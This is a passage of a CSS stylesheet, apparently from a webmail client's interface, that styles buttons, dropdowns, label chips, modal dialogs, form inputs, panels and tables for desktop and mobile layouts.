        .pm_buttons.disabled {
            border: 1px solid #c9cbd5;
            color: #acb0bf
        }

        .pm_buttons .disabled,
        .pm_buttons [disabled] {
            pointer-events: none;
            -webkit-box-shadow: none;
            box-shadow: none;
            -webkit-box-shadow: inset 0 0 50rem 0 #f3f5f8;
            box-shadow: inset 0 0 50rem 0 #f3f5f8;
            color: #acb0bf
        }

        .pm_buttons .dead {
            pointer-events: none;
            cursor: default
        }

        .pm_buttons .fa {
            font-size: 16px
        }

        .pm_buttons .fa.fa-angle-down {
            font-size: 14px;
            margin-left: 2px
        }

        .pm_buttons .fa.fa-angle-down.wide {
            padding: 0 10px
        }

        .pm_buttons .pm_buttons {
            float: left;
            border-radius: 0;
            margin: 0 !important;
            border: none
        }

        .pm_buttons .pm_buttons.pm_button {
            height: 33px;
            line-height: 36px
        }

        .pm_buttons .pm_buttons:not(:first-of-type) {
            border-left: 1px solid #acb0bf
        }

        .pm_buttons a {
            display: -webkit-inline-flex;
            display: -webkit-inline-box;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center;
            text-decoration: none;
            color: inherit;
            padding: 0 10px;
            cursor: pointer;
            -webkit-transition: all .3s ease-out;
            transition: all .3s ease-out;
            -webkit-tap-highlight-color: transparent;
            z-index: 1;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            background: #fff
        }

        .pm_buttons a.fa-angle-down {
            padding: 0 3px
        }

        .pm_buttons a.fa-angle-down.wide {
            padding: 0 10px
        }

        .pm_buttons a:focus,
        .pm_buttons a:hover {
            background-color: #f2f2f2;
            color: #222;
            -webkit-transition: none;
            transition: none
        }

        .pm_buttons a.active,
        .pm_buttons a:active {
            background: #e5e5e5;
            -webkit-box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2);
            box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2)
        }

        .pm_buttons a.inheritPadding {
            padding: inherit
        }

        .pm_buttons strong {
            font-size: 12px;
            text-transform: uppercase
        }

        .pm_buttons>* {
            border-left: 1px solid #acb0bf
        }

        .pm_buttons>:first-child {
            border-radius: 2px 0 0 2px;
            border-left: none
        }

        .pm_buttons>:last-child {
            border-radius: 0 2px 2px 0
        }

        .pm_buttons.primary a {
            background-color: #9397cd;
            border-color: #9397cd;
            color: #fff
        }

        .pm_buttons.primary a:focus,
        .pm_buttons.primary a:hover {
            background-color: #7e82b4;
            border-color: #7e82b4
        }

        .pm_buttons.primary a:active {
            background-color: 66669a;
            border-color: 66669a
        }

        .pm_buttons.primary>* {
            border-left: 1px solid #fff
        }

        .pm_buttons.primary>:first-child {
            border-left: none
        }

        .pm_buttons .pm_buttons-child {
            border-width: 0 0 0 1px;
            padding: 0;
            -webkit-box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            box-shadow: 0 1px 2px 0 rgba(0, 0, 0, .1);
            background: #fff
        }

        .pm_buttons .pm_buttons-child:focus,
        .pm_buttons .pm_buttons-child:hover {
            background-color: #f2f2f2;
            color: #222
        }

        .pm_buttons .pm_buttons-child:active {
            background: #e5e5e5;
            -webkit-box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2);
            box-shadow: inset 0 2px 2px 0 rgba(0, 0, 0, .2)
        }

        .pm_buttons>.pm_buttons-child.fa:before,
        .pm_buttons>.pm_buttons-child>div {
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-box-flex: 1;
            -webkit-flex-grow: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            padding: 0 10px;
            cursor: pointer;
            -webkit-transition: all .3s ease-out;
            transition: all .3s ease-out;
            pointer-events: none
        }

        .pm_button [type=checkbox][disabled]:before,
        .pm_buttons [type=checkbox][disabled]:before {
            content: "";
            display: inline-block;
            width: 12px;
            height: 12px;
            background: #c9cbd5;
            border-radius: 2px
        }

        .pm_button,
        .pm_buttons,
        .pm_trigger {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none
        }

        body.appConfigBody-is-mobile .pm_buttons {
            margin: 0 5px 0 0
        }

        body.appConfigBody-is-mobile .pm_buttons:last-of-type {
            margin: 0
        }

        body .pm_checkbox input[type=checkbox] {
            margin: 13px 10px 0 0
        }

        body .conversation .fa-check-square,
        body .conversation .fa-square-o {
            display: none !important
        }

        body.appConfigBody-is-mobile #body #pm_main .selection input[type=checkbox],
        body.appConfigBody-is-mobile #body #pm_main label.pm_checkbox {
            top: 0;
            left: 0;
            height: 100%;
            width: 100%;
            opacity: 0
        }

        body.appConfigBody-is-mobile #body #pm_main .labelDropdown input[type=checkbox] {
            display: inline-block !important
        }

        body.appConfigBody-is-mobile #body #pm_main .fa-check-square,
        body.appConfigBody-is-mobile #body #pm_main .fa-square-o {
            display: inline-block !important;
            font-size: 2rem;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            border: none;
            background: transparent;
            text-decoration: none;
            color: #6a6f7c;
            width: 2rem
        }

        .pm_dropdown {
            position: absolute;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            left: -1px;
            top: 100%;
            background: #fff;
            border: 1px solid #acb0bf;
            padding: 5px 15px;
            z-index: 4;
            margin-top: 5px;
            display: none;
            font-size: 12px;
            width: 8rem;
            max-height: 260px;
            overflow: auto;
            -webkit-overflow-scrolling: touch;
            border-radius: 2px !important;
            -webkit-box-shadow: 4px 4px 4px rgba(0, 0, 0, .15);
            box-shadow: 4px 4px 4px rgba(0, 0, 0, .15)
        }

        .pm_dropdown.pm_dropdown-opened {
            display: block
        }

        .pm_dropdown.right {
            right: -1px;
            left: auto !important
        }

        .pm_dropdown.wide {
            width: 200px;
            max-height: none;
            padding: 15px
        }

        .pm_dropdown.wider {
            width: 240px;
            max-height: none;
            padding: 15px
        }

        .pm_dropdown.widest {
            width: 280px;
            max-height: none;
            padding: 15px
        }

        .pm_dropdown.open {
            display: block
        }

        .pm_dropdown.noPadding {
            padding: 0
        }

        .pm_dropdown>button {
            background: transparent;
            color: currentColor;
            border: 0
        }

        .pm_dropdown>a,
        .pm_dropdown>button,
        .pm_dropdown>ul>li {
            cursor: pointer;
            width: 100%;
            text-align: left;
            display: block;
            line-height: 35px !important;
            height: 35px !important;
            padding: 0 !important;
            border-bottom: 1px solid #acb0bf;
            white-space: nowrap;
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .pm_dropdown>a .fa,
        .pm_dropdown>button .fa,
        .pm_dropdown>ul>li .fa {
            line-height: 35px !important;
            height: 35px !important;
            display: inline-block;
            width: 1.5rem
        }

        .pm_dropdown>a:hover,
        .pm_dropdown>button:hover,
        .pm_dropdown>ul>li:hover {
            background-color: transparent !important;
            color: #333 !important
        }

        .pm_dropdown>a em,
        .pm_dropdown>button em,
        .pm_dropdown>ul>li em {
            font-style: normal
        }

        .pm_dropdown>a:last-child,
        .pm_dropdown>button:last-child {
            border-bottom: none
        }

        .pm_dropdown>ul {
            display: block;
            margin: 0;
            padding: 0
        }

        .pm_dropdown>ul li label {
            display: block
        }

        .pm_labels,
        .pm_labels * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .pm_labels {
            position: relative;
            display: -webkit-inline-box;
            display: -webkit-inline-flex;
            display: -ms-inline-flexbox;
            display: inline-flex;
            -webkit-flex-wrap: wrap;
            -ms-flex-wrap: wrap;
            flex-wrap: wrap;
            max-width: 88%;
            background: inherit
        }

        .pm_labels [class*=-label] {
            display: -webkit-box;
            display: -webkit-flex;
            display: -ms-flexbox;
            display: flex;
            background: inherit;
            -webkit-box-align: center;
            -webkit-align-items: center;
            -ms-flex-align: center;
            align-items: center;
            margin-left: .25em;
            border-radius: 3px;
            max-width: 8rem;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border: 2px solid currentColor;
            -webkit-transition: max-width .25s ease;
            transition: max-width .25s ease;
            line-height: 1;
            max-height: 100%
        }

        .pm_labels [class*=-label]:last-of-type {
            margin-right: 0
        }

        .pm_labels [class*=-hidden] {
            display: none
        }

        .pm_labels [class*=-name] {
            padding: 0 .4rem;
            overflow: hidden;
            white-space: nowrap;
            text-overflow: ellipsis
        }

        .pm_labels [class*=-more] {
            pointer-events: none;
            overflow: hidden;
            border-left-width: 0 !important;
            border-radius: 0 3px 3px 0;
            line-height: 14px;
            color: rgba(0, 0, 0, .35);
            max-width: 1.5rem;
            width: 1.5rem;
            text-align: center;
            background: rgba(0, 0, 0, .1);
            padding: 0;
            margin: 0
        }

        .pm_labels [class*=-btn-] {
            pointer-events: all;
            background: transparent;
            color: currentColor;
            border: 0
        }

        .pm_labels [class*=-btn-]:active {
            color: #9397cd
        }

        .pm_labels [class*=-btn-]:focus {
            outline: 1px solid grey
        }

        .pm_labels[data-format=stack] [class*=-label]:not(:first-of-type) {
            max-width: .5rem;
            padding-right: 0;
            overflow: hidden;
            border-left-width: 0 !important;
            border-radius: 0 3px 3px 0
        }

        .pm_labels[data-format=stack] [class*=-label]:not(:first-of-type):hover {
            border-left-width: 2px !important;
            border-radius: 3px;
            max-width: 8rem;
            line-height: 14px;
            padding: 0 .4rem
        }

        .pm_labels:not([data-button=remove]) [class*=btn-remove] {
            display: none
        }

        .pm_modal {
            position: absolute;
            z-index: 99998;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            left: 0;
            top: 0;
            right: 0;
            bottom: 0;
            overflow: auto;
            -webkit-overflow-scrolling: touch
        }

        .pm_modal iframe {
            width: 100%
        }

        .pm_modal .angular-squire-wrapper {
            border: 1px solid #acb0bf;
            border-top: none
        }

        .pm_modal.domains .modal-dialog .modal-content .modal-body {
            -webkit-box-shadow: inset 0 1px 0 #acb0bf, inset 0 -1px 0 #acb0bf;
            box-shadow: inset 0 1px 0 #acb0bf, inset 0 -1px 0 #acb0bf;
            z-index: 2
        }

        .pm_modal.important {
            z-index: 99999
        }

        .pm_modal.very-important {
            z-index: 100000
        }

        .pm_modal.small .modal-dialog {
            width: 30rem;
            max-width: 100%;
            bottom: auto !important;
            margin-left: -15rem
        }

        .pm_modal.small .modal-dialog .modal-content .modal-body,
        .pm_modal.small .modal-dialog .modal-content .modal-header {
            padding: 1rem 2rem
        }

        .pm_modal.small .modal-dialog .modal-footer {
            clear: both;
            padding: 1rem 2rem
        }

        .pm_modal .modal-overlay {
            content: "";
            display: block;
            position: fixed;
            left: 0;
            top: 0;
            right: 0;
            bottom: 0;
            z-index: 1;
            background: rgba(0, 0, 0, .2);
            pointer-events: none
        }

        .pm_modal .modal-dialog {
            position: relative;
            z-index: 2;
            background: #fff;
            left: 50%;
            width: 48rem;
            margin-top: 3rem;
            margin-bottom: 3rem;
            margin-left: -24rem;
            border: 5px solid #9397cd;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .pm_modal .modal-dialog .close {
            position: absolute;
            right: -5px;
            top: -5px;
            width: 25px;
            height: 25px;
            line-height: 25px;
            text-align: center;
            padding: 0;
            color: #fff;
            background: #9397cd;
            cursor: pointer;
            display: block;
            outline: none;
            border: none;
            z-index: 9999
        }

        .pm_modal .modal-dialog .modal-content {
            background: #fff
        }

        .pm_modal .modal-dialog .modal-content .modal-header {
            padding: 1rem 2rem
        }

        .pm_modal .modal-dialog .modal-content .modal-body {
            padding: 1rem 2rem;
            -webkit-box-shadow: inset 0 1px 0 #acb0bf, inset 0 -1px 0 #acb0bf;
            box-shadow: inset 0 1px 0 #acb0bf, inset 0 -1px 0 #acb0bf;
            clear: both;
            zoom: 1;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            width: 100%
        }

        .pm_modal .modal-dialog .modal-footer {
            clear: both;
            padding: 1rem 2rem;
            background-color: #fff
        }

        .pm_modal .modal-dialog .modal-content h1,
        .pm_modal .modal-dialog .modal-content h2,
        .pm_modal .modal-dialog .modal-content h3,
        .pm_modal .modal-dialog .modal-content h4 {
            font-size: 22px;
            line-height: 36px;
            font-weight: 400;
            color: #222
        }

        .pm_modal .modal-dialog .modal-content h1 em,
        .pm_modal .modal-dialog .modal-content h2 em,
        .pm_modal .modal-dialog .modal-content h3 em,
        .pm_modal .modal-dialog .modal-content h4 em {
            font-style: normal;
            color: #e1e1e1
        }

        .pm_modal .modal-dialog .modal-content .clearfix {
            padding: 5px;
            margin: 0 -5px
        }

        .pm_modal .modal-details {
            border: 1px solid #acb0bf;
            margin: 0 0 .4em
        }

        .pm_modal .modal-summary {
            font-size: 1.1em;
            font-weight: 700;
            cursor: pointer;
            padding: 1em
        }

        .pm_modal .modal-content-details {
            padding: 0 1em
        }

        body.appConfigBody-is-mobile .pm_modal.small .modal-dialog {
            width: 50%;
            margin-left: -25%;
            left: 50%;
            top: 2rem
        }

        body.appConfigBody-is-mobile .pm_modal .modal-dialog {
            position: absolute;
            z-index: 2;
            background: #fff;
            left: 0;
            right: 0;
            top: 0;
            width: 100%;
            margin: 0;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            border: none
        }

        body.appConfigBody-is-mobile .pm_modal .modal-dialog .close {
            top: 0;
            right: 0;
            height: 3rem;
            line-height: 3rem;
            width: 3rem;
            background-color: transparent;
            color: #555
        }

        body.appConfigBody-is-mobile .pm_modal .modal-dialog .modal-content {
            top: 3rem
        }

        body.appConfigBody-is-mobile .pm_modal.small .modal-dialog {
            width: 100%;
            bottom: auto !important;
            margin-left: 0;
            left: 0;
            top: 0
        }

        .pm_form legend {
            padding: 0;
            margin: 0;
            font-size: 20px;
            border-bottom: 1px solid #acb0bf;
            line-height: 1.5em;
            display: block;
            width: 100%;
            margin-bottom: 1rem;
            font-weight: 200
        }

        .pm_form legend .small {
            font-size: .8rem;
            font-weight: 400;
            color: #555
        }

        .pm_form legend .small a {
            color: #9397cd
        }

        .pm_form legend.no-border {
            border-bottom: 0
        }

        .pm_form .card-container .pm_grid,
        .pm_form.filter-form .pm_grid,
        .pm_form legend.no-margin {
            margin: 0
        }

        .pm_form .pm_select {
            position: relative;
            display: block;
            -webkit-box-shadow: inset 0 0 0 1px #acb0bf, 0 1px 2px rgba(0, 0, 0, .1);
            box-shadow: inset 0 0 0 1px #acb0bf, 0 1px 2px rgba(0, 0, 0, .1);
            border-radius: 2px
        }

        .pm_form .pm_select.inline {
            display: inline-block
        }

        .pm_form .pm_select.inline select {
            width: 8rem
        }

        .pm_form .pm_select.inline select.autoWidth {
            width: auto
        }

        .pm_form .pm_select.bigger select {
            width: 10rem
        }

        .pm_form .pm_select.mini select {
            width: 4rem
        }

        .pm_form .pm_select select::-ms-expand {
            display: none
        }

        .pm_form .pm_select select {
            margin: 0;
            height: 35px;
            line-height: 35px;
            padding-left: 10px;
            position: relative;
            z-index: 3;
            background: transparent;
            border: none;
            width: 100%;
            max-width: 100%;
            min-width: 3rem;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        .pm_form .pm_select select[disabled] {
            background: transparent
        }

        .pm_form .pm_select .fa {
            position: absolute;
            right: 0;
            display: block;
            text-align: center;
            top: 0;
            bottom: 0;
            height: 35px;
            line-height: 35px;
            z-index: 1;
            width: 2rem;
            color: #222
        }

        .pm_form select {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
            cursor: pointer;
            background: #fff
        }

        .pm_form select.ng-invalid.always-show-ng-invalid,
        .pm_form select.ng-invalid.always-show-ng-invalid:focus,
        .pm_form select.ng-invalid.ng-touched,
        .pm_form select.ng-invalid.ng-touched:focus {
            color: #cc9393
        }

        .pm_form textarea.code {
            font-family: monospace;
            white-space: pre;
            word-break: none;
            line-height: 1rem;
            resize: vertical;
            height: 10rem;
            padding: 1rem
        }

        .pm_form .input-icon {
            position: relative
        }

        .pm_form .input-icon.right input[type=number],
        .pm_form .input-icon.right input[type=text] {
            padding-left: 20px
        }

        .pm_form .input-icon.right .fa {
            left: auto;
            right: 1px
        }

        .pm_form .input-icon input[type=number],
        .pm_form .input-icon input[type=tel],
        .pm_form .input-icon input[type=text] {
            position: relative;
            padding-left: 2rem
        }

        .pm_form .input-icon .fa {
            position: absolute;
            left: 1px;
            top: 1px;
            bottom: 1px;
            text-align: left;
            display: block;
            line-height: 32px;
            height: 32px;
            color: #e1e1e1;
            text-align: center;
            width: 2rem;
            z-index: 2
        }

        .pm_form input[type=email],
        .pm_form input[type=number],
        .pm_form input[type=password],
        .pm_form input[type=search],
        .pm_form input[type=tel],
        .pm_form input[type=text],
        .pm_form input[type=url],
        .pm_form select {
            height: 35px
        }

        .pm_form input[type=email],
        .pm_form input[type=number],
        .pm_form input[type=password],
        .pm_form input[type=search],
        .pm_form input[type=tel],
        .pm_form input[type=text],
        .pm_form input[type=url] {
            -webkit-box-shadow: inset 0 2px 5px rgba(0, 0, 0, .15);
            box-shadow: inset 0 2px 5px rgba(0, 0, 0, .15);
            background: #fafafa
        }

        .pm_form input[type=email].inline,
        .pm_form input[type=number].inline,
        .pm_form input[type=password].inline,
        .pm_form input[type=search].inline,
        .pm_form input[type=tel].inline,
        .pm_form input[type=text].inline,
        .pm_form input[type=url].inline {
            display: inline-block;
            width: 8rem
        }

        .pm_form input[type=email].bigger,
        .pm_form input[type=number].bigger,
        .pm_form input[type=password].bigger,
        .pm_form input[type=search].bigger,
        .pm_form input[type=tel].bigger,
        .pm_form input[type=text].bigger,
        .pm_form input[type=url].bigger {
            width: 10rem
        }

        .pm_form input[type=email].mini,
        .pm_form input[type=number].mini,
        .pm_form input[type=password].mini,
        .pm_form input[type=search].mini,
        .pm_form input[type=tel].mini,
        .pm_form input[type=text].mini,
        .pm_form input[type=url].mini {
            width: 5rem
        }

        .pm_form input[type=email].search,
        .pm_form input[type=number].search,
        .pm_form input[type=password].search,
        .pm_form input[type=search].search,
        .pm_form input[type=tel].search,
        .pm_form input[type=text].search,
        .pm_form input[type=url].search {
            border-radius: 32px
        }

        .pm_form select:active,
        .pm_form select:focus {
            -webkit-box-shadow: inset 0 0 0 1px #9397cd;
            box-shadow: inset 0 0 0 1px #9397cd
        }

        .pm_form input[type=email],
        .pm_form input[type=number],
        .pm_form input[type=password],
        .pm_form input[type=search],
        .pm_form input[type=tel],
        .pm_form input[type=text],
        .pm_form input[type=url],
        .pm_form select,
        .pm_form textarea {
            line-height: 35px;
            border: 1px solid #acb0bf;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            color: #222;
            display: block;
            width: 100%;
            font-size: 1em;
            border-radius: 2px;
            position: relative;
            resize: none;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none
        }

        .pm_form input[type=email]+[ng-messages],
        .pm_form input[type=number]+[ng-messages],
        .pm_form input[type=password]+[ng-messages],
        .pm_form input[type=search]+[ng-messages],
        .pm_form input[type=tel]+[ng-messages],
        .pm_form input[type=text]+[ng-messages],
        .pm_form input[type=url]+[ng-messages],
        .pm_form select+[ng-messages],
        .pm_form textarea+[ng-messages] {
            opacity: 0
        }

        .pm_form input[type=email]+[ng-messages],
        .pm_form input[type=email]+[ng-messages] p,
        .pm_form input[type=number]+[ng-messages],
        .pm_form input[type=number]+[ng-messages] p,
        .pm_form input[type=password]+[ng-messages],
        .pm_form input[type=password]+[ng-messages] p,
        .pm_form input[type=search]+[ng-messages],
        .pm_form input[type=search]+[ng-messages] p,
        .pm_form input[type=tel]+[ng-messages],
        .pm_form input[type=tel]+[ng-messages] p,
        .pm_form input[type=text]+[ng-messages],
        .pm_form input[type=text]+[ng-messages] p,
        .pm_form input[type=url]+[ng-messages],
        .pm_form input[type=url]+[ng-messages] p,
        .pm_form select+[ng-messages],
        .pm_form select+[ng-messages] p,
        .pm_form textarea+[ng-messages],
        .pm_form textarea+[ng-messages] p {
            height: 1em;
            margin: .6em 0 .8em
        }

        .pm_form input[type=email].ng-invalid.ng-dirty+[ng-messages],
        .pm_form input[type=number].ng-invalid.ng-dirty+[ng-messages],
        .pm_form input[type=password].ng-invalid.ng-dirty+[ng-messages],
        .pm_form input[type=search].ng-invalid.ng-dirty+[ng-messages],
        .pm_form input[type=tel].ng-invalid.ng-dirty+[ng-messages],
        .pm_form input[type=text].ng-invalid.ng-dirty+[ng-messages],
        .pm_form input[type=url].ng-invalid.ng-dirty+[ng-messages],
        .pm_form select.ng-invalid.ng-dirty+[ng-messages],
        .pm_form textarea.ng-invalid.ng-dirty+[ng-messages] {
            opacity: 1
        }

        .pm_form input[type=email].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=email].ng-invalid.ng-dirty,
        .pm_form input[type=number].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=number].ng-invalid.ng-dirty,
        .pm_form input[type=password].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=password].ng-invalid.ng-dirty,
        .pm_form input[type=search].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=search].ng-invalid.ng-dirty,
        .pm_form input[type=tel].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=tel].ng-invalid.ng-dirty,
        .pm_form input[type=text].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=text].ng-invalid.ng-dirty,
        .pm_form input[type=url].ng-invalid.always-show-ng-invalid,
        .pm_form input[type=url].ng-invalid.ng-dirty,
        .pm_form select.ng-invalid.always-show-ng-invalid,
        .pm_form select.ng-invalid.ng-dirty,
        .pm_form textarea.ng-invalid.always-show-ng-invalid,
        .pm_form textarea.ng-invalid.ng-dirty {
            border-color: #cc9393
        }

        .pm_form input[type=email].inline,
        .pm_form input[type=number].inline,
        .pm_form input[type=password].inline,
        .pm_form input[type=search].inline,
        .pm_form input[type=tel].inline,
        .pm_form input[type=text].inline,
        .pm_form input[type=url].inline,
        .pm_form select.inline,
        .pm_form textarea.inline {
            display: inline-block;
            width: 8rem
        }

        .pm_form input[type=email]:hover,
        .pm_form input[type=number]:hover,
        .pm_form input[type=password]:hover,
        .pm_form input[type=search]:hover,
        .pm_form input[type=tel]:hover,
        .pm_form input[type=text]:hover,
        .pm_form input[type=url]:hover,
        .pm_form select:hover,
        .pm_form textarea:hover {
            border-color: #acb0bf
        }

        .pm_form input[type=email]:focus,
        .pm_form input[type=number]:focus,
        .pm_form input[type=password]:focus,
        .pm_form input[type=search]:focus,
        .pm_form input[type=tel]:focus,
        .pm_form input[type=text]:focus,
        .pm_form input[type=url]:focus,
        .pm_form select:focus,
        .pm_form textarea:focus {
            color: #000;
            border-color: #9397cd;
            outline: none
        }

        .pm_form input[type=email].disabled,
        .pm_form input[type=email][disabled],
        .pm_form input[type=number].disabled,
        .pm_form input[type=number][disabled],
        .pm_form input[type=password].disabled,
        .pm_form input[type=password][disabled],
        .pm_form input[type=search].disabled,
        .pm_form input[type=search][disabled],
        .pm_form input[type=tel].disabled,
        .pm_form input[type=tel][disabled],
        .pm_form input[type=text].disabled,
        .pm_form input[type=text][disabled],
        .pm_form input[type=url].disabled,
        .pm_form input[type=url][disabled],
        .pm_form select.disabled,
        .pm_form select[disabled],
        .pm_form textarea.disabled,
        .pm_form textarea[disabled] {
            color: #bbb;
            border-color: #babeca;
            background: #fcfcfc;
            pointer-events: none
        }

        .pm_form input[type=email][readonly],
        .pm_form input[type=number][readonly],
        .pm_form input[type=password][readonly],
        .pm_form input[type=search][readonly],
        .pm_form input[type=tel][readonly],
        .pm_form input[type=text][readonly],
        .pm_form input[type=url][readonly],
        .pm_form select[readonly],
        .pm_form textarea[readonly] {
            -webkit-box-shadow: none;
            box-shadow: none
        }

        .pm_form input[type=email].success,
        .pm_form input[type=number].success,
        .pm_form input[type=password].success,
        .pm_form input[type=search].success,
        .pm_form input[type=tel].success,
        .pm_form input[type=text].success,
        .pm_form input[type=url].success,
        .pm_form select.success,
        .pm_form textarea.success {
            color: #93bf73;
            border-color: #aecf96
        }

        .pm_form input[type=email].error,
        .pm_form input[type=number].error,
        .pm_form input[type=password].error,
        .pm_form input[type=search].error,
        .pm_form input[type=tel].error,
        .pm_form input[type=text].error,
        .pm_form input[type=url].error,
        .pm_form select.error,
        .pm_form textarea.error {
            color: #bf7373;
            border-color: #cf9696
        }

        .pm_form input[type=email].warning,
        .pm_form input[type=number].warning,
        .pm_form input[type=password].warning,
        .pm_form input[type=search].warning,
        .pm_form input[type=tel].warning,
        .pm_form input[type=text].warning,
        .pm_form input[type=url].warning,
        .pm_form select.warning,
        .pm_form textarea.warning {
            color: #caad7e;
            border-color: #d9c4a2
        }

        .pm_form input[type=email],
        .pm_form input[type=number],
        .pm_form input[type=password],
        .pm_form input[type=search],
        .pm_form input[type=tel],
        .pm_form input[type=text],
        .pm_form input[type=url],
        .pm_form select,
        .pm_form textarea {
            padding: 0 20px;
            margin: 0
        }

        .pm_form input[type=email].noBorder,
        .pm_form input[type=number].noBorder,
        .pm_form input[type=password].noBorder,
        .pm_form input[type=search].noBorder,
        .pm_form input[type=tel].noBorder,
        .pm_form input[type=text].noBorder,
        .pm_form input[type=url].noBorder,
        .pm_form select.noBorder,
        .pm_form textarea.noBorder {
            border-color: transparent !important
        }

        .pm_form input[type=email].margin,
        .pm_form input[type=number].margin,
        .pm_form input[type=password].margin,
        .pm_form input[type=search].margin,
        .pm_form input[type=tel].margin,
        .pm_form input[type=text].margin,
        .pm_form input[type=url].margin,
        .pm_form select.margin,
        .pm_form textarea.margin {
            margin-bottom: 10px
        }

        .pm_form input[type=number]::-webkit-inner-spin-button,
        .pm_form input[type=number]::-webkit-outer-spin-button {
            -webkit-appearance: none
        }

        .pm_form input[type=number] {
            -moz-appearance: textfield
        }

        .pm_form textarea {
            min-height: 6rem;
            -webkit-box-shadow: inset 0 2px 4px rgba(0, 0, 0, .15);
            box-shadow: inset 0 2px 4px rgba(0, 0, 0, .15);
            background: #fafafa;
            padding: .5rem 1rem;
            line-height: 1.5rem
        }

        .pm_form select {
            width: auto;
            line-height: 32px;
            height: 32px
        }

        .pm_form .margin {
            margin-bottom: 10px
        }

        .pm_form label {
            height: 35px;
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-align-items: center;
            -webkit-box-align: center;
            -ms-flex-align: center;
            align-items: center
        }

        .pm_form label>.customMaskInput-container {
            width: auto
        }

        .pm_form label>:not(:only-child) {
            -webkit-align-self: center;
            -ms-flex-item-align: center;
            align-self: center;
            margin-right: .4rem
        }

        .pm_form label>.label-fillWidth {
            -webkit-flex-grow: 1;
            -webkit-box-flex: 1;
            -ms-flex-positive: 1;
            flex-grow: 1;
            overflow: hidden
        }

        .pm_form label:after {
            content: "";
            clear: both
        }

        .pm_form .multi-line-label {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex;
            -webkit-flex-direction: column;
            -webkit-box-orient: vertical;
            -webkit-box-direction: normal;
            -ms-flex-direction: column;
            flex-direction: column;
            -webkit-flex: 1;
            -webkit-box-flex: 1;
            -ms-flex: 1;
            flex: 1;
            min-height: 0
        }

        .pm_form .multi-line-label>label {
            height: auto;
            min-height: 25px;
            padding: 5px 0
        }

        .pm_form .row {
            float: left;
            width: 100%;
            clear: both
        }

        .pm_form .pm_single_action {
            display: -webkit-flex;
            display: -webkit-box;
            display: -ms-flexbox;
            display: flex
        }

        .pm_form .pm_single_action .input:last-of-type {
            border-top-right-radius: 0;
            border-bottom-right-radius: 0
        }

        .pm_form .pm_single_action .pm_button:first-of-type {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0
        }

        .ng-submitted input.ng-invalid+[ng-messages],
        .ng-submitted select.ng-invalid+[ng-messages],
        .ng-submitted textarea.ng-invalid+[ng-messages] {
            opacity: 1 !important
        }

        .ng-submitted input.ng-invalid,
        .ng-submitted select.ng-invalid,
        .ng-submitted textarea.ng-invalid {
            border-color: #cc9393 !important
        }

        .pm_panel {
            width: 400px;
            margin: auto;
            color: #fff;
            padding: 50px;
            max-width: 100%
        }

        .pm_panel,
        .pm_panel.alt {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .pm_panel.alt {
            background: hsla(0, 0%, 100%, .1);
            border: 1px solid hsla(0, 0%, 100%, .25);
            margin-top: 8rem;
            margin-bottom: 2rem;
            padding: 50px 70px 0;
            min-height: 350px
        }

        .pm_panel.alt a {
            color: #fff
        }

        .pm_panel.wide {
            width: 600px
        }

        body.light .pm_panel {
            background: #fff;
            color: #555
        }

        body.appConfigBody-is-mobile .pm_panel {
            width: 100%;
            padding: 20px !important;
            margin-top: 2rem
        }

        #support-message .wrap,
        #support-reset-password .wrap {
            width: 400px;
            margin: 2rem auto;
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .pm_table {
            max-width: 100%;
            white-space: nowrap;
            overflow-x: auto;
            overflow-y: hidden
        }

        .pm_table.visibleOverflow {
            overflow: visible
        }

        .pm_table table {
            border-collapse: collapse;
            table-layout: auto;
            width: 100%;
            margin-bottom: 1rem
        }

        .pm_table table thead {
            border-top: 1px solid #acb0bf
        }

        .pm_table table.fixedLayout {
            table-layout: fixed
        }

        .pm_table table.print em {
            font-style: normal;
            border: 1px solid #acb0bf;
            padding: 1px 4px;
            margin-right: 4px;
            border-radius: 2px
        }

        .pm_table table.print th {
            width: 4rem;
            background-color: transparent;
            text-transform: none
        }

        .pm_table table.print tr {
            border: none
        }

        .pm_table table.print table {
            border-width: 0 0 1px
        }

        .pm_table table.limited {
            display: table;
            width: 100%
        }

        .pm_table table.limited tbody {
            float: left;
            width: 100%;
            overflow: auto;
            max-height: 300px
        }

        .pm_table table.limited tbody tr {
            width: 100%;
            display: table
        }

        .pm_table table.bordered {
